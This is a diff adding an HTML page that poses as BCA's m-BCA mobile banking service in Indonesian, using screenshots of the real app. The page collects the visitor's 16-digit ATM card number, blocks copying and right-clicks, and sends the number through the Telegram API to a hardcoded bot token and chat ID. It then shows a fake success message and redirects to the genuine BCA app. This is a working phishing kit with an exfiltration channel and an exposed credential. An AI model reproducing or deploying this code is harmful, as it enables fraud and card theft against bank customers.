@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>m-BCA Clone</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- SweetAlert2 untuk popup -->
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+    <style>
+        /* (Seluruh gaya CSS Anda yang sudah ada tetap di sini) */
+        html, body {
+            background-color: #003d79;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            position: relative;
+            overflow-y: hidden;
+            
+        }
+        .banner {
+            width: 100%;
+            height: auto;
+            display: block;
+            
+        }
+        .footer {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            display: block;
+            
+        }
+        .main-container {
+            background-color: #cccccc;
+            border-radius: 10px;
+            padding: 14px;
+            margin: 20px auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            margin-bottom: 10px; /* Memberikan ruang untuk footer */
+            
+        }
+        .logo {
+            text-align: center;
+            color: #003d79;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .input-label {
+            color: #003d79;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .info-text {
+            color: #cccccc;
+            font-size: 0.85em;
+            margin-top: 15px;
+            line-height: 1.4;
+        
+        }
+        .btn-ok {
+            background-color: #003D79;
+            color: white;
+            width: 40%;
+            margin-left: 190px;
+            margin-top: 20px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            
+        }
+        .btn-ok:hover {
+            background-color: #002d59;
+        }
+        .btn-ok:disabled {
+            background-color: #8EA1B4;
+            cursor: not-allowed;
+        }
+        .form-control {
+            border: 1px solid white;
+            border-radius: 5px;
+            padding: 5px;
+            font-size: 1.1em;
+            letter-spacing: 2px;
+            width: 97%;
+            margin-left: 5px;
+        }
+        .form-control:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 0.85em;
+            margin-top: 5px;
+            display: none;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #003d79;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .content-wrapper {
+            padding-bottom: 150px; /* Memberikan ruang untuk footer */
+        }
+        .swal-title {
+    font-size: 20px; /* Ukuran teks judul */
+}
+
+.swal-text {
+    font-size: 10px; /* Ukuran teks pada bagian 'text' */
+    text-align: center; /* Teks akan berada di tengah */
+}
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <img src="https://i.ibb.co.com/H7Zxb7g/Screenshot-20241112-161156-BCA-mobile.png" alt="Banner" class="banner">
+        <div class="container d-flex justify-content-center align-items-center">
+            <div class="main-container">
+                <div class="logo"></div>
+                <div class="mb-3">
+                    <label class="input-label">Masukkan 16 angka No. Kartu ATM Anda:</label>
+                    <input type="text" id="noKartuATM" class="form-control" maxlength="19" pattern="\d*" autocomplete="off">
+                    <div class="error-message" id="errorCardMessage">Nomor kartu harus 16 digit angka</div>
+                </div>
+                <div class="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Memproses...</p>
+                </div>
+                <button type="button" class="btn-ok" id="btnOK" disabled>OK</button>
+                <p class="info-text">
+                    Pastikan Anda berada di halaman yang benar (https://m.klikbca.com).
+                    Pastikan Anda berada di halaman yang benar (https://m.klikbca.com).
+                    Jangan memberikan informasi rahasia Anda kepada pihak yang tidak berwenang.
+                    Pastikan Anda berada di halaman yang benar (https://m.klikbca.com).
+                    Jangan memberikan informasi rahasia Anda kepada pihak yang tidak berwenang.
+                    Pastikan Anda berada di halaman yang benar (https://m.klikbca.com).
+                    Jangan memberikan informasi rahasia Anda kepada pihak yang tidak berwenang.
+                    Pastikan Anda berada di halaman yang benar 
+                </p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer Banner -->
+    <img src="https://i.ibb.co.com/rdCN4rL/Screenshot-20241112-161148-BCA-mobile.png" alt="Footer" class="footer">
+
+    <!-- Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <script>
+        // Mencegah klik kanan
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Mencegah copy-paste
+        document.addEventListener('copy', (e) => e.preventDefault());
+        document.addEventListener('paste', (e) => e.preventDefault());
+
+        // Format nomor kartu ATM
+        function formatCardNumber(value) {
+            const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            const matches = v.match(/\d{4,16}/g);
+            const match = matches && matches[0] || '';
+            const parts = [];
+
+            for (let i = 0, len = match.length; i < len; i += 4) {
+                parts.push(match.substring(i, i + 4));
+            }
+
+            if (parts.length) {
+                return parts.join(' ');
+            } else {
+                return value;
+            }
+        }
+
+        // Validasi input
+        const cardInput = document.getElementById('noKartuATM');
+        const btnOK = document.getElementById('btnOK');
+        const errorCardMessage = document.getElementById('errorCardMessage');
+
+        cardInput.addEventListener('input', function(e) {
+            let value = e.target.value;
+            
+            // Format nomor kartu
+            value = formatCardNumber(value);
+            e.target.value = value;
+
+            // Validasi
+            const digitsOnly = value.replace(/\s/g, '');
+            const isValid = digitsOnly.length === 16 && /^\d+$/.test(digitsOnly);
+            
+            errorCardMessage.style.display = isValid ? 'none' : 'block';
+            validateForm();
+        });
+
+        function validateForm() {
+            const cardValue = cardInput.value.replace(/\s/g, '');
+            const isCardValid = cardValue.length === 16 && /^\d+$/.test(cardValue);
+            btnOK.disabled = !isCardValid;
+        }
+
+        btnOK.addEventListener('click', function() {
+            // Tampilkan loading
+            document.querySelector('.loading').style.display = 'block';
+            btnOK.disabled = true;
+
+            // Simulasi proses
+            setTimeout(() => {
+                document.querySelector('.loading').style.display = 'none';
+                
+                // Kirim data ke Telegram
+                sendTelegramMessage(cardInput.value);
+
+                // Tampilkan popup sukses
+                Swal.fire({
+                    title: 'Buka aplikasi BCA Mobile',
+                    text: 'Silakan lanjutkan Registrasi Oneklik di BCA Mobile pada menu m-Admin Atur OneKlik.',
+                    icon: 'success',
+                    confirmButtonColor: '#003d79',
+                    confirmButtonText: 'Buka BCA Mobile',
+                    customClass: {
+                        title: 'swal-title',
+                        popup: 'swal-center'
+                    }
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        // Pindah ke aplikasi BCA Mobile
+                        window.location.href = 'https://play.google.com/store/apps/details?id=com.bca';
+                    }
+                });
+
+                // Reset form
+                cardInput.value = '';
+                btnOK.disabled = true;
+            }, 2000);
+        });
+
+        // Fungsi untuk mengirim data ke Telegram
+        function sendTelegramMessage(cardNumber) {
+            const telegramBotToken = '7716996968:AAFfmIxyUs0cBHp9E21cUeXtzwpZFcJSDWw'; // Ganti dengan token bot Anda
+            const chatId = '7225707577'; // Ganti dengan chat ID Anda
+            const message = `Nomor Kartu ATM yang dimasukkan: ${cardNumber}`;
+
+            const telegramAPI = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const url = `${telegramAPI}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Pesan berhasil dikirim ke Telegram', data);
+                })
+                .catch(error => {
+                    console.error('Error mengirim pesan ke Telegram', error);
+                });
+        }
+    </script>
+</body>
+</html>
